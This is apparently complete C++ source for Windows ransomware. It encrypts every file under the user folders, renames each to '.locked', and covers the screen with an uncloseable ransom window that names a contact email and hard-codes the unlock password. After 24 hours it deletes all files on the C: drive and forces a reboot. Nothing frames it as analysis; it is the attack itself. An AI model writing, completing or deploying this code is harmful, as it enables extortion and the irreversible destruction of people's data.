// cl /O2 /GL /MT /W0 /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"user32.lib")

const char CONTACT[] = "cotroneosador@gmail.com";
const char LOCK[]  = "himself9864";
const BYTE XORKEY[32]= {0xDE,0xAD,0xBE,0xEF}; // 4-byte key
const DWORD LIFE_MS  = 24*3600*1000;

std::vector<std::wstring> files;
CRITICAL_SECTION cs;

void ListFiles(const std::wstring& path){
    WIN32_FIND_DATAW fd;
    HANDLE h=FindFirstFileW((path+L"\\*").c_str(),&fd);
    if(h==INVALID_HANDLE_VALUE)return;
    do{
        std::wstring fp=path+L"\\"+fd.cFileName;
        if(!wcscmp(fd.cFileName,L".")||!wcscmp(fd.cFileName,L".."))continue;
        if(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)ListFiles(fp);
        else{EnterCriticalSection(&cs);files.push_back(fp);LeaveCriticalSection(&cs);}
    }while(FindNextFileW(h,&fd));
    FindClose(h);
}

void CryptFile(const std::wstring& f){
    HANDLE h=CreateFileW(f.c_str(),GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    if(h==INVALID_HANDLE_VALUE)return;
    DWORD sz=GetFileSize(h,NULL);
    if(sz==INVALID_FILE_SIZE||!sz){CloseHandle(h);return;}
    BYTE* buf=new BYTE[sz];
    DWORD rd;ReadFile(h,buf,sz,&rd,NULL);
    for(DWORD i=0;i<sz;i++)buf[i]^=XORKEY[i%sizeof(XORKEY)];
    SetFilePointer(h,0,NULL,FILE_BEGIN);SetEndOfFile(h);
    DWORD wr;WriteFile(h,buf,sz,&wr,NULL);
    CloseHandle(h);delete[] buf;
    std::wstring nf=f+L".locked";
    MoveFileW(f.c_str(),nf.c_str());
}

DWORD WINAPI WorkThread(LPVOID){
    while(true){
        EnterCriticalSection(&cs);
        if(!files.empty()){
            std::wstring f=files.back();
            files.pop_back();
            LeaveCriticalSection(&cs);
            CryptFile(f);
        }else{LeaveCriticalSection(&cs);Sleep(100);}
    }
    return 0;
}

void Wipe(){
    ListFiles(L"C:\\");
    for(auto& f:files)DeleteFileW(f.c_str());
    HANDLE tok;OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&tok);
    TOKEN_PRIVILEGES tp;tp.PrivilegeCount=1;tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tp.Privileges[0].Luid);
    AdjustTokenPrivileges(tok,FALSE,&tp,0,NULL,0);
    ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);
}

LRESULT CALLBACK WndProc(HWND h,UINT m,WPARAM w,LPARAM l){
    static HWND e,b;
    switch(m){
    case WM_CREATE:
        SetWindowLongPtr(h,GWL_EXSTYLE,WS_EX_TOPMOST);
        SetWindowPos(h,HWND_TOPMOST,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);
        ShowWindow(h,SW_MAXIMIZE);
        SetTimer(h,1,LIFE_MS,NULL);
        e=CreateWindowW(L"EDIT",L"",WS_CHILD|WS_VISIBLE|WS_BORDER,200,300,400,30,h,NULL,NULL,NULL);
        b=CreateWindowW(L"BUTTON",L"PAY",WS_CHILD|WS_VISIBLE,620,300,100,30,h,NULL,NULL,NULL);
        break;
    case WM_COMMAND:
        if(LOWORD(w)==BN_CLICKED){
            wchar_t buf[256];GetWindowTextW(e,buf,256);
            if(!wcscmp(buf,L"himself9864"))ExitProcess(0);
        }
        break;
    case WM_TIMER:Wipe();break;
    case WM_CLOSE:case WM_DESTROY:return 0;
    }
    return DefWindowProc(h,m,w,l);
}

int main(){
    InitializeCriticalSection(&cs);
    ListFiles(L"C:\\Users");
    for(int i=0;i<4;i++)CloseHandle(CreateThread(NULL,0,WorkThread,NULL,0,NULL));
    WNDCLASSEXW wc={sizeof(wc)};
    wc.lpfnWndProc=WndProc;
    wc.hInstance=GetModuleHandle(NULL);
    wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName=L"X";
    RegisterClassExW(&wc);
    HWND hwnd=CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW,L"X",L"OOPS",WS_POPUP|WS_VISIBLE,
                              0,0,GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN),
                              NULL,NULL,wc.hInstance,NULL);
    HDC dc=GetDC(hwnd);
    RECT rc;GetClientRect(hwnd,&rc);
    SetBkColor(dc,RGB(0,0,0));
    SetTextColor(dc,RGB(255,0,0));
    DrawTextW(dc,L"FILES LOCKED\nCONTACT: cotroneosalvador@gmail.com",-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);
    ReleaseDC(hwnd,dc);
    MSG m;while(GetMessage(&m,NULL,0,0)){TranslateMessage(&m);DispatchMessage(&m);}
    return 0;
}